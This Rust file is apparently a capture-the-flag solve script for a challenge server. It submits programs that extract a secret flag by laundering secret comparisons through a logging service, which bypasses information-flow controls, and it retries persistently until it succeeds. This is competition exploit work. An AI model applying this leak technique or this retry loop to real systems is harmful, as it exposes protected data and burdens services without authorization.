// Minimal single-shot probe for "An old soviet terminal".
// Submits ONE hand-written retriever body (staged: menu -> 4 -> code -> EOF),
// drains the teletype, prints it. Retries ONLY on connect-fail (paced). Any
// teletype result (Message OR abnormal) -> print + exit. Use to measure the
// 2000ms budget with the CHEAPEST programs before running the full sweep.
//
//   rustc -O probe.rs -o probe
//   ./probe <preset> [GAP_SECS]
// presets:
//   len        -> analyze length only         (1 cross-node round trip)  cheapest
//   g          -> is flag[0]=='g' ? "g":"?"   (1 compare + 1 log)
//   c IDX CH   -> is flag[IDX]==CH            (1 compare + 1 log)
//   raw '...'  -> submit argv[2] verbatim as the retriever body

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
// Result frame is teletype-rendered 2-10s AFTER EOF (server wrapper budget = 10s).
// The old 2600ms drain hung up ~8s before [TIMEOUT] frames even arrived -> they were
// misread as "no-teletype". Frame header observed at 10.1-11.1s post-EOF; wait 14s so
// network jitter never clips it. read_phase early-exits on the header, so a fast
// success/error costs nothing -- only a truly hung connection waits the full cap.
const FRAME_WAIT: Duration = Duration::from_millis(30000);

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || hay.len() < needle.len() { return false; }
    hay.windows(needle.len()).any(|w| w == needle)
}

fn read_phase(s: &mut TcpStream, needle: Option<&[u8]>, overall: Duration) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 8192];
    let start = Instant::now();
    loop {
        if start.elapsed() >= overall { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&tmp[..n]);
                if let Some(nd) = needle { if contains(&buf, nd) { break; } }
            }
            Err(e) => match e.kind() {
                // keep waiting until `overall` elapses (loop top checks). Needle is
                // satisfied via the Ok(n) branch; here we just don't give up early.
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
    buf
}

fn attempt(addr: &std::net::SocketAddr, prog: &[u8]) -> std::io::Result<Vec<u8>> {
    let mut s = TcpStream::connect_timeout(addr, Duration::from_secs(6))?;
    s.set_read_timeout(Some(Duration::from_millis(10050)))?;
    s.set_write_timeout(Some(Duration::from_secs(10)))?;
    let mut out = Vec::new();
    out.extend_from_slice(&read_phase(&mut s, Some(b">>"), Duration::from_secs(4)));
    s.write_all(b"4\n")?; s.flush()?;
    out.extend_from_slice(&read_phase(&mut s, Some(b">>"), Duration::from_secs(4)));
    s.write_all(prog)?; s.write_all(b"\nEOF\n")?; s.flush()?;
    // wait for the result frame header (Message / [ERROR] / [TIMEOUT] all carry it),
    // then a short tail to capture the verdict line + flag.
    out.extend_from_slice(&read_phase(&mut s, Some(b"TELETYPE OUTPUT"), FRAME_WAIT));
    out.extend_from_slice(&read_phase(&mut s, Some(b"grey{"), Duration::from_millis(20000)));
    Ok(out)
}

fn build(args: &[String]) -> String {
    match args.get(0).map(|s| s.as_str()) {
        // zero services: ship retriever to receiver, return a constant string. Tests
        // engine + transport + 2000ms budget for a TRIVIAL program. No int conversion.
        Some("none") => "\"AAAA\"".to_string(),
        // analyze round trip, return constant (no int->string). Channel test.
        Some("ok") => {
            "send(analysisService,(\"analyze\",self()));\
             receive[hn(\"analysis\",L)=>\"OK\"]".to_string()
        }
        // real length as a string of '#' (only uses ^, like fast.py). Count the #.
        Some("len") => {
            "let val _=send(analysisService,(\"analyze\",self()))\n\
             val n=receive[hn(\"analysis\",L)=>L]\n\
             fun s i=if i>=n then \"\" else \"#\"^s(i+1)\n\
             in s 0 end".to_string()
        }
        Some("g") => {
            "send(analysisService,(\"compare\",self(),0,\"g\"));\
             receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));\
             receive[hn(\"logged\",b)=>if b then \"g\" else \"?\"])]".to_string()
        }
        Some("c") => {
            let idx = args.get(1).map(|s| s.as_str()).unwrap_or("0");
            let ch  = args.get(2).map(|s| s.as_str()).unwrap_or("g");
            format!("send(analysisService,(\"compare\",self(),{},\"{}\"));\
                     receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));\
                     receive[hn(\"logged\",b)=>if b then \"{}\" else \"?\"])]", idx, ch, ch)
        }
        // WHOLE FLAG in one submission: analyze -> length n (public), then scan 0..n,
        // laundering each compare through logService -> public bool -> branch. Returns
        // the full flag string. One healthy server window = the whole flag, one teletype.
        Some("flag") => {
            "let val cs=\"grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\
             fun a j=substring(cs,j,j+1)\n\
             fun p i d=(send(analysisService,(\"compare\",self(),i,d));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>b])])\n\
             fun sc i j=if a j=\"\" then \"?\" else if p i(a j)then a j else sc i(j+1)\n\
             val _=send(analysisService,(\"analyze\",self()))\n\
             val n=receive[hn(\"analysis\",L)=>L]\n\
             fun bd i=if i>=n then \"\" else (sc i 0)^bd(i+1)\n\
             in bd 0 end".to_string()
        }
        Some("raw") => args.get(1).cloned().unwrap_or_default(),
        _ => { eprintln!("usage: ./probe none|ok|len|g|c IDX CH|flag|raw '<code>' [GAP]"); std::process::exit(2); }
    }
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    let prog = build(&argv);
    // GAP is the last numeric arg if present; default 15
    let gap: u64 = argv.last().and_then(|x| x.parse().ok()).unwrap_or(15);

    let addr = (HOST, PORT).to_socket_addrs().ok().and_then(|mut a| a.next())
        .expect("DNS resolve failed");
    println!("[*] probe prog ({} bytes):\n{}\n---", prog.len(), prog);

    // ONESHOT=1 -> do exactly ONE attempt, then exit with a code the shell can read:
    //   0  = real Message (flag) captured        (caller stops the 24h loop)
    //   10 = connected + ran but no flag (abnormal / early-close) -> retry
    //   20 = connect refused (RST)                                -> retry
    let oneshot = std::env::var("ONESHOT").map(|v| v == "1").unwrap_or(false);

    // adaptive pacing: a refused connect (RST) costs the box nothing -> retry fast.
    // anything that consumed a worker (ran/abnormal/early-close) -> back off `gap`.
    let fast: u64 = (gap / 4).max(2);
    let mut tries: u32 = 0;
    let mut hits: u32 = 0;      // count of connects that actually reached a worker
    loop {
        tries += 1;
        let t0 = Instant::now();
        match attempt(&addr, prog.as_bytes()) {
            Err(e) => {
                println!("[try {} | hits {}] connfail: {} ({:.2}s)", tries, hits, e, t0.elapsed().as_secs_f32());
                if oneshot { std::process::exit(20); }
                std::thread::sleep(Duration::from_secs(fast));
            }
            Ok(b) => {
                let out = String::from_utf8_lossy(&b);
                let dt = t0.elapsed().as_secs_f32();
                // extract Message line if present
                let msg = out.lines().find(|l| l.contains("Message:") || l.contains("grey{"))
                    .map(|l| l.replace('\u{2551}', "").replace("Message:", "").trim().to_string())
                    .filter(|m| !m.is_empty());
                let abn = out.contains("terminated abnormally");
                let tmo = out.contains("exceeded time allocation") || out.contains("[TIMEOUT]");
                let teletype = out.contains("TELETYPE");
                hits += 1;
                let verdict = if msg.is_some() { "MESSAGE" } else if abn { "ERROR(abnormal)" }
                    else if tmo { "TIMEOUT(10s)" } else if teletype { "frame-no-verdict" } else { "no-frame" };
                println!("[try {} | hits {}] connected ({:.2}s)  verdict={}", tries, hits, dt, verdict);
                if let Some(m) = &msg { println!("    >>> {:?}", m); }
                println!("----- raw tail -----");
                for line in out.lines().rev().take(18).collect::<Vec<_>>().iter().rev() {
                    println!("{}", line);
                }
                if let Some(m) = &msg {                     // real Message -> done
                    println!("\n#### FLAG/RESULT: {:?} ####", m);
                    let _ = std::fs::write("flag.txt", m);
                    if oneshot { std::process::exit(0); }
                    break;
                }
                // TIMEOUT (receiver unreachable in 10s) / ERROR (troupe died) = retry
                println!("({})", match verdict {
                    "TIMEOUT(10s)" => "timeout: terminal blocked 10s waiting on @receiver (contended)",
                    "ERROR(abnormal)" => "abnormal: troupe process died early",
                    _ => "no frame: connection closed before result",
                });
                if oneshot { std::process::exit(10); }
                std::thread::sleep(Duration::from_secs(gap));
            }
        }
    }
}
